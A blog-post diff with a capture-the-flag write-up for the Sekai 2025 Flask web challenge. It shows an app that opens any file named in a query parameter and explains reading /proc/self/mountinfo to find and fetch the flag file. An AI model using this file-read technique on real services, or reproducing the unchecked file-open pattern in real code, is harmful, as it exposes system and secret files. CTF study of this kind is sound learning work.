@@ -1,0 +1,56 @@
+---
+layout: post
+title:  "Sekai 2025 (CTF)"
+date:   2025-08-18 20:05:43 -0400
+author: robo.uzi
+tags: [CTF, Web]
+---
+## My Flask App
+
+Web: I created a Web application in Flask, what could be wrong?
+
+Author: belugagemink
+
+The site trolls you by asking if you want the flag and then moving the yes/no buttons around the screen. 
+
+I look at the source code:
+```shell
+from flask import Flask, request, render_template  
+  
+app = Flask(__name__)  
+  
+@app.route('/')  
+def hello_world():  
+   return render_template('index.html')  
+  
+@app.route('/view')  
+def view():  
+   filename = request.args.get('filename')  
+   if not filename:  
+       return "Filename is required", 400  
+   try:  
+       with open(filename, 'r') as file:  
+           content = file.read()  
+       return content, 200  
+   except FileNotFoundError:  
+       return "File not found", 404  
+   except Exception as e:  
+       return f"Error: {str(e)}", 500  
+  
+if __name__ == '__main__':  
+   app.run(host='0.0.0.0', port=5000, debug=True)
+```
+Ok good. Looks like simple arbitrary file read with `/view?filename=`.
+
+I look at different files for a while until I check `/proc/self/mountinfo`. In the output I see:
+
+```shell
+/var/lib/kubelet/pods/cb8ef257-b118-4d33-85d2-02cb4ddeb687/volumes/kubernetes.io~configmap/cfgmap/..2025_08_16_02_26_54.3578576440/flag /flag-88192kJ22sKDr3kwsuzm5cDSZ3bGgzK3.txt ro,relatime - ext4 /dev/nvme0n1p1 rw,commit=30 4345 4337 259:1 /var/lib/kubelet/pods/cb8ef257-b118-4d33-85d2-02cb4ddeb687/etc-hosts /etc/hosts rw,relatime...
+```
+
+Dumping `/proc/self/mountinfo` lets you enumerate all mounts inside the kubernetes pod the app runs on. I get the flag at: `https://my-flask-app-vrx0felhbrr8.chals.sekai.team:1337/view?filename=/flag-88192kJ22sKDr3kwsuzm5cDSZ3bGgzK3.txt`
+
+This ctf was fun but very challenging. Especially in the web category. I got close on a few other challenges but ultimately ran out of time. Its always a learning experience as long as you read the writeups! I hope you enjoyed or found it helpful.
+
+___
+
